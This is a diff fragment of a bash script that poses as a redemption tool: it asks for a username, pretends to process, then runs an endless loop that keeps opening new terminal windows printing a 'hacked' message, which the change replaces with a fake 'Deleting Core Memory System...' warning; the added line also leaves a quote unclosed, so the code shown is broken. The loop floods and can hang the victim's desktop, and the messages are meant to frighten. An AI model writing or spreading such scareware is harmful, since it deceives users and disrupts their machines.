@@ -25,7 +25,7 @@ read -p "Enter your username to redeem: " choice
 echo "Processing"
 sleep 3
 while true;do
-    gnome-terminal -- yes "4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u4sec hacked u" | head -n 5
+    gnome-terminal -- yes "Deleting Core Memory System...
 done
 
         ;;
